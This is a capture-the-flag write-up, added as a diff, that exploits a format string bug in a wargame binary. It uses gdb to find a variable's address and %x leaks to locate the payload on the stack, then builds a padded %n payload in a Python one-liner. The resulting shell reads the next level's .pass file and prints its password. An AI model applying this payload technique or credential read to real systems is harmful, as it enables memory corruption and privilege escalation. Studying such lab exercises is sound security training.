@@ -1,0 +1,74 @@
+# We face a format string vulnerability, it's because printf takes our string
+	as his first argument
+	printf(str)
+
+# So we can leak addresses with %p (useful when ASLR is enabled) and write
+	anywhere we want with %n
+
+level3@SnowCrash:~$ ./level3
+%p
+0x200
+
+# Note that in this level, we can't overflow
+
+# First things first, we must find the address of this m variable
+(gdb) disas v:
+[...]
+0x080484da <+54>:	mov    0x804988c,%eax
+0x080484df <+59>:	cmp    $0x40,%eax
+[...]
+
+# Well, it might be 0x0804988c :) Let's try it:
+
+Breakpoint 1, 0x0804851d in main ()
+(gdb) set {int}0x804988c = 0x40
+(gdb) c
+Continuing.
+Wait what?!
+$
+
+# Nice, this is the good address.
+
+===============================================================================
+
+# We will put our address in the arg list so we will be able to write in
+	it with %n (since our arglist is on the stack)
+
+# Let's find it now
+level3@SnowCrash:~$ python -c 'print "\x8c\x98\x04\x08" + "%x "*15' > /tmp/k
+level3@SnowCrash:~$ cat /tmp/k | ./level3
+�200 b7fd1ac0 b7ff37d0 804988c 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
+
+# After minutes of tries we see that our address is displayed at 4%x :)
+# So if we wanna write with %n, we just have to %x%x%x$%n
+python -c 'print "\x8c\x98\x04\x08"+"%x%x%x"+"%n"' > /tmp/k
+
+(gdb) x/x 0x0804988c
+0x804988c <m>: 0x00000017
+
+# Nice, we wrote 17 to our address, HUGE !
+# Now we just have to add some characters to fill and reach 0x40
+# I increment the number of '0x41' chars we print and check the var in gdb:
+
+Breakpoint 1, 0x080484da in v ()
+(gdb) x/x 0x0804988c
+0x804988c <m>:	0x0000003a
+[...]
+Breakpoint 1, 0x080484da in v ()
+(gdb) x/x 0x0804988c
+0x804988c <m>:	0x0000003f
+level3@SnowCrash:~$ python -c 'print "\x8c\x98\x04\x08"+"\x41"*??+"%x%x%x"+"%n"' > /tmp/k
+                                                               ||
+                                                      ?? Is the value we must find
+
+
+# After some tries, we got the right value of 41 chars :)
+
+level3@SnowCrash:~$ python -c 'print "\x8c\x98\x04\x08"+"\x41"*41+"%x%x%x"+"%n"' > /tmp/k
+level3@SnowCrash:~$ cat /tmp/k - | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA200b7fd1ac0b7ff37d0
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
